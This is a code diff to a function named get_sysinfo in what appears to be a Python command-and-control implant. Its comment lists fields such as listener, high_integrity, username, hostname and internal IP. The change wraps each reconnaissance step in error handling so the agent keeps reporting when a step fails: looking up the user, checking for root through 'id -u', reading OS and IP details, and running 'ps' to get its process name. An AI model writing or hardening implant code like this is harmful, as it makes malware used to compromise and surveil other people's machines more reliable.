@@ -738,23 +738,48 @@ def post_message(uri, data):
 def get_sysinfo(nonce='00000000'):
 
     # nonce | listener | domainname | username | hostname | internal_ip | os_details | os_details | high_integrity | process_name | process_id | language | language_version
-    username = pwd.getpwuid(os.getuid())[0] 
+    __FAILED_FUNCTION = '[FAILED QUERY]'
 
-    uid = os.popen('id -u').read().strip()
-    highIntegrity = 'True' if (uid == '0') else False
+    try:
+        username = pwd.getpwuid(os.getuid())[0]
+    except Exception as e:
+        username = __FAILED_FUNCTION
+    try:
+        uid = os.popen('id -u').read().strip()
+    except Exception as e:
+        uid = __FAILED_FUNCTION
+    try:
+        highIntegrity = "True" if (uid == "0") else False
+    except Exception as e:
+        highIntegrity = __FAILED_FUNCTION
+    try:
+        osDetails = os.uname()
+    except Exception as e:
+        osDetails = __FAILED_FUNCTION
+    try:
+        hostname = osDetails[1]
+    except Exception as e:
+        hostname = __FAILED_FUNCTION
+    try:
+        internalIP = socket.gethostbyname(socket.gethostname())
+    except Exception as e:
+        internalIP = __FAILED_FUNCTION
+    
+    try:
+        osDetails = ",".join(osDetails)
+    except Exception as e:
+        osDetails =  __FAILED_FUNCTION
+    try:
+        processID = os.getpid()
+    except Exception as e:
+        processID = __FAILED_FUNCTION
+    try:
+        temp = sys.version_info
+        pyVersion = "%s.%s" % (temp[0],temp[1])
+    except Exception as e:
+        pyVersion = __FAILED_FUNCTION
 
-    osDetails = os.uname()
-    hostname = osDetails[1]
-
-    internalIP = socket.gethostbyname(socket.gethostname())
-
-    osDetails = ",".join(osDetails)
-    processID = os.getpid()
-    temp = sys.version_info
-    pyVersion = "%s.%s" % (temp[0], temp[1])
     language = 'python'
-
-    # get the current process name
     cmd = 'ps %s' % (os.getpid())
     ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
     out = ps.stdout.read()
